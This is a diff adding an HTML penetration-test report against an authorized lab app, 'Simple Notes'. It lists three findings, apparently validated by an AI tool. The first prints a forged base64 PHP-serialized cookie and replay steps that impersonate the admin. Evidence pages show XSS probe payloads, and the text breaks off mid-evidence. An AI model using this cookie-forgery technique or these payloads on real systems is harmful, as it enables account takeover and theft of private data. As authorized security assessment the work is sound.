@@ -1,0 +1,1937 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqz4zez5-p1ozj6</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [session] Account impersonation via forgeable PHP-serialized identity cookie (&quot;data&quot;) — insecure deserialization</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — known CVE-2019-0211 local root privilege escalation (+ later SSRF/smuggling CVEs)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] End-of-life PHP 7.1.33 — unsupported since 2019-12-01, multiple unpatched post-EOL CVEs</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqz4zez5-p1ozj6</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32873/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T11:30:38.084Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>12 mapped · 12 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32873</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [session] Account impersonation via forgeable PHP-serialized identity cookie (&quot;data&quot;) — insecure deserialization</h3>
+<div class="kv">Screen: <code>s-0004</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32873/</div>
+<div class="desc">Identity is carried in a client-side cookie `data` = base64(PHP serialize(UserProfile)), e.g. `O:11:&quot;UserProfile&quot;:2:{s:6:&quot;userid&quot;;i:N;s:8:&quot;username&quot;;s:..:&quot;..&quot;;}`. The cookie is NOT HttpOnly and has NO integrity protection (no HMAC/signature), so it is fully attacker-forgeable, and the value is unserialize()'d server-side (insecure deserialization). The server trusts the deserialized `userid` to load that user's notes and echoes `username` directly. Forging `data` for `userid=1, username=admin` (with no valid PHPSESSID) logs an unauthenticated attacker in as another user and discloses their private notes — here admin's &quot;Flag / My Secret Flag&quot;. Any account is reachable by changing the userid integer. This is the exact forgeable-cookie condition flagged by session analysis (not HttpOnly + tamper-able value); the negative control (garbage value) yields an empty unauthenticated profile, proving the forged value is what grants access.</div>
+<div><b>Reproduction</b></div><pre>1) analyze_session: cookie `data` = base64 of `O:11:&quot;UserProfile&quot;:2:{s:6:&quot;userid&quot;;i:&lt;id&gt;;s:8:&quot;username&quot;;s:&lt;len&gt;:&quot;&lt;name&gt;&quot;;}`, HttpOnly=false, no signature.
+2) Forge: base64 of `O:11:&quot;UserProfile&quot;:2:{s:6:&quot;userid&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;}` = `TzoxMToiVXNlclByb2ZpbGUiOjI6e3M6NjoidXNlcmlkIjtpOjE7czo4OiJ1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==`.
+3) GET /index.php with `Cookie: data=&lt;forged&gt;; PHPSESSID=` (no credentials, no valid session).
+4) Result: 200 &quot;Welcome admin&quot; + user 1's private notes &quot;Flag / My Secret Flag&quot;, &quot;ToDo&quot;. Stable across replays (ev-...-28, ev-...-29; bodyLength 2450).
+5) Negative control: same request with `data=bm90LXZhbGlk...` (invalid serialized value) → &quot;Welcome &quot; empty, no notes (ev-...-27; bodyLength 1528). Increment the userid to impersonate/enumerate any user.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5rzzh-27</code> — <code>artifacts/s-0004/ev-mqz5rzzh-27/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 1528
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 11:52:51 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome &lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+            &lt;form method=&quot;post&quot; action=&quot;/index.php&quot;&gt;
+                &lt;table width=&quot;100%&quot;&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot;&gt;&lt;h3&gt;Add Note&lt;/h3&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td text-align=&quot;right&quot; align=&quot;right&quot;&gt;Title:&lt;/td&gt;
+                        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td valign=&quot;top&quot; text-align=&quot;right&quot; align=&quot;right&quot;&gt;Content:&lt;/td&gt;
+                        &lt;td&gt;&lt;textarea name=&quot;content&quot; rows=&quot;10&quot; cols=&quot;30&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/textarea&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot; align=&quot;right&quot;&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; value=&quot;Add&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/table&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5s1jm-28</code> — <code>artifacts/s-0004/ev-mqz5s1jm-28/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 2450
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 11:52:53 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome admin&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Flag&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;My Secret Flag &lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;ToDo&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;Test web app security.&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                            &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+            &lt;form method=&quot;post&quot; action=&quot;/index.php&quot;&gt;
+                &lt;table width=&quot;100%&quot;&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot;&gt;&lt;h3&gt;Add Note&lt;/h3&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td text-align=&quot;right&quot; align=&quot;right&quot;&gt;Title:&lt;/td&gt;
+                        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td valign=&quot;top&quot; text-align=&quot;right&quot; align=&quot;right&quot;&gt;Content:&lt;/td&gt;
+                        &lt;td&gt;&lt;textarea name=&quot;content&quot; rows=&quot;10&quot; cols=&quot;30&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/textarea&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot; align=&quot;right&quot;&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; value=&quot;Add&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/table&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz5sf4n-29</code> — <code>artifacts/s-0004/ev-mqz5sf4n-29/</code></div><div class="lbl">REQUEST</div><pre>GET /index.php HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 2450
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 11:53:11 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+set-cookie: &lt;redacted&gt;
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome admin&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Flag&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;My Secret Flag &lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;ToDo&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;Test web app security.&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                            &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+            &lt;form method=&quot;post&quot; action=&quot;/index.php&quot;&gt;
+                &lt;table width=&quot;100%&quot;&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot;&gt;&lt;h3&gt;Add Note&lt;/h3&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td text-align=&quot;right&quot; align=&quot;right&quot;&gt;Title:&lt;/td&gt;
+                        &lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;title&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td valign=&quot;top&quot; text-align=&quot;right&quot; align=&quot;right&quot;&gt;Content:&lt;/td&gt;
+                        &lt;td&gt;&lt;textarea name=&quot;content&quot; rows=&quot;10&quot; cols=&quot;30&quot; style=&quot;width: 95%;&quot; required&gt;&lt;/textarea&gt;&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td colspan=&quot;2&quot; align=&quot;right&quot;&gt;&lt;input class=&quot;button&quot; type=&quot;submit&quot; value=&quot;Add&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/table&gt;
+            &lt;/form&gt;
+        &lt;/div&gt;
+    &lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.38 (Debian) — known CVE-2019-0211 local root privilege escalation (+ later SSRF/smuggling CVEs)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32873/</div>
+<div class="desc">The server runs Apache httpd 2.4.38 (Debian), released Jan 2019. This is a VERSION-BASED finding: the version was read from the `Server: Apache/2.4.38 (Debian)` response header (and echoed verbatim in the default 404 page address line — `Apache/2.4.38 (Debian) Server at target.local Port 32873`), NOT exploited. Operator should verify against the actual loaded modules/config before relying on it.
+
+Known issues affecting 2.4.38 (all fixed in 2.4.39+, so this build is missing them):
+- CVE-2019-0211 — mod_prefork/scoreboard local privilege escalation: code executing in a less-privileged child (e.g. a PHP/CGI script — and this host serves PHP) can manipulate shared memory to gain the privileges of the parent process (root) on the next graceful restart. CVSS 7.8 / High. This is the headline risk for 2.4.38 on a PHP host and would chain with any code-exec foothold.
+- CVE-2019-0215 — mod_ssl TLS 1.3 client-cert access-control bypass.
+- CVE-2019-0217 — mod_auth_digest access-control bypass / race.
+- CVE-2019-0220 — URL normalization inconsistency (multiple consecutive slashes) enabling access-control bypass.
+
+Additionally, 2.4.38 is far below the fix line for several later high/critical issues that apply if the relevant modules are enabled (config-dependent, not confirmed here): CVE-2021-40438 (mod_proxy SSRF, CVSS 9.0, fixed 2.4.49), CVE-2022-22720 (HTTP request smuggling, fixed 2.4.53), CVE-2023-25690 (mod_proxy request smuggling, fixed 2.4.56). NOTE: CVE-2021-41773/42013 (path-traversal RCE) affect ONLY 2.4.49/2.4.50 and do NOT apply to 2.4.38.
+
+Remediation: upgrade to a current Apache 2.4.6x package and suppress the version banner (ServerTokens Prod / ServerSignature Off).</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32873/ and inspect response headers → `Server: Apache/2.4.38 (Debian)` (ev-mqz72xst-5j, 200/27470 bytes). 2. Reproduced identically on /index.php (ev-mqz72yer-5k, 200/27470 bytes). 3. Negative control: GET /verdict-nonexistent-path-404-check returns a 404 (ev-mqz7301p-5m, 404/279 bytes) — distinguishable by status and length; its address line also discloses Apache/2.4.38. Map version 2.4.38 to the CVEs above (all fixed in 2.4.39+).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz7301p-5m</code> — <code>artifacts/_/ev-mqz7301p-5m/</code></div><div class="lbl">REQUEST</div><pre>GET /verdict-nonexistent-path-404-check HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 279
+content-type: text/html; charset=iso-8859-1
+date: Mon, 29 Jun 2026 12:29:24 GMT
+keep-alive: timeout=5, max=97
+server: Apache/2.4.38 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.38 (Debian) Server at target.local Port 32873&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz72xst-5j</code> — <code>artifacts/_/ev-mqz72xst-5j/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32873
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE (truncated)</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 27470
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 12:29:21 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.38 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/7.1.33
+
+&lt;!doctype html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+      &lt;title&gt;Simple Notes&lt;/title&gt;
+      &lt;link rel=&quot;stylesheet&quot; href=&quot;static/styles.css&quot;&gt;
+      &lt;link rel=&quot;icon&quot; href=&quot;static/favicon.ico&quot; type=&quot;image/x-icon&quot;&gt;
+    &lt;/head&gt;
+    &lt;body&gt;
+        &amp;nbsp;&lt;/br&gt;
+        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                &lt;tr&gt;
+                    &lt;td width=&quot;90%&quot;&gt;&lt;h1&gt;Welcome test&lt;/h1&gt;&lt;/td&gt;
+                    &lt;td text-align=&quot;right&quot;&gt;&lt;a class=&quot;button&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;&lt;/td&gt;
+                &lt;/tr&gt;
+            &lt;/table&gt;
+        &lt;/div&gt;
+                                &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-testfile&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-content-marker&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;verdict-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdict-probe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5ngu6676vsafe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;quot;&amp;gt;&amp;lt;img src=x onerror=&amp;quot;window.__verdict_xss=\'stoXmqz5ngu6676v\'&amp;quot;&amp;gt;&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;Zmark9h3&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;&amp;lt;img src=x onerror=alert(1)&amp;gt;Zmark9body&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;h3&gt;xss-probe2&lt;/h3&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                            &lt;tr&gt;
+                                &lt;td&gt;&lt;p&gt;verdictstoXmqz5pnlnesg7safe&lt;/p&gt;&lt;/td&gt;
+                            &lt;/tr&gt;
+                        &lt;/table&gt;
+                        &lt;/div&gt;
+                                            &amp;nbsp;&lt;/br&gt;
+                        &lt;div class=&quot;center blue&quot;&gt;
+                        &lt;table&gt;
+                            &lt;tr&gt;
